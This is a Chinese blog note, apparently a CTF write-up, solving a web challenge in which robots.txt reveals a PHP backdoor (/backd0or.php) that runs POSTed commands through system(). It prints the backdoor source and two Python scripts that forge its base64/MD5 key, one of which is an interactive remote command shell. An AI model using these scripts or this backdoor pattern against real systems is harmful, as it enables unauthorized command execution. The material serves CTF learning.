> 最近事太多都没时间做题，好不容易抽出时间来复现一下之前新生赛的他们发现还是能学到很多新东西，于是写一篇笔记来记录一下。
>

**题目复现链接：**[**https://ctf.xidian.edu.cn/training/14?challenge=568**](https://ctf.xidian.edu.cn/training/14?challenge=568)

**相关题解：**[**https://ns.openctf.net/wp/2024/week1/web/zhixieweiji.html**](https://ns.openctf.net/wp/2024/week1/web/zhixieweiji.html)

**题目详解：**

一开始的知识点就是一个robots.txt泄露的敏感路径，没什么好说的，关键是在/backd0or.php中的rce应该如何执行，先放下源码

```plain
 <?php

function execute_cmd($cmd) {
    system($cmd);
}

function decrypt_request($cmd, $key) {
    $decoded_key = base64_decode($key);
    $reversed_cmd = '';
    for ($i = strlen($cmd) - 1; $i >= 0; $i--) {
        $reversed_cmd .= $cmd[$i];
    }
    $hashed_reversed_cmd = md5($reversed_cmd);
    if ($hashed_reversed_cmd !== $decoded_key) {
        die("Invalid key");
    }
    $decrypted_cmd = base64_decode($cmd);
    return $decrypted_cmd;
}

if (isset($_POST['cmd']) && isset($_POST['key'])) {
    execute_cmd(decrypt_request($_POST['cmd'],$_POST['key']));
}
else {
    highlight_file(__FILE__);
}
?> 
```

	就是用POST传两个值，cmd是执行的命令，key是一个验证加密的内容，过程打大概就是key先base64加密，再给cmd字符串内容倒置再md5加密后与key比较，相等后返回cmd的base64才能执行cmd的内容。

我一开始是根据以上内容写了一个逆向的脚本

```plain
import requests
import base64
import hashlib

url="https://127.0.0.1:62972/backd0or.php"
cmd="whoami"
cmd_encode=base64.b64encode(cmd.encode()).decode()
cmd_reverse=cmd_encode[::-1]
hash_reversed_cmd=hashlib.md5(cmd_reverse.encode()).hexdigest()
encoded_key=base64.b64encode(hash_reversed_cmd.encode()).decode()
payload={
    'cmd':cmd_encode,
    'key':encoded_key
}
response=requests.post(url,data=payload)
print(f"[+]{response.text}")
```

	只要改变cmd的内容就能完成rce，读取到flag。但是我在看wp之后发现了一个交互式shell脚本更方便解题，贴在下面：

```plain
import requests
import base64
import hashlib
print("[+] Shell for newstar_zhixieweiji")
url = input("[+] Enter the target URL: ")
def execute_command(cmd):
    cmd_encoded = base64.b64encode(cmd.encode()).decode()
    cmd_reversed = cmd_encoded[::-1]
    hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()
    encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()
    payload = {'cmd': cmd_encoded,'key': encoded_key}
    response = requests.post(url, data=payload)
    return response.text[:-1]
hostname = execute_command("hostname")
username = execute_command("whoami")
while True:
    directory = execute_command("pwd")
    command = input(f"{username}@{hostname}:{directory}$ ")
    output = execute_command(command)
    print(output)
```

	这个脚本的优点是可以运行一次时执行多次命令，在找flag的位置时很方便，而且模仿了linux命令行的界面，可以看到用户名和用户权限。最关键的是脚本用了模块化编程，只要把函数改一改就能用在其他题上。

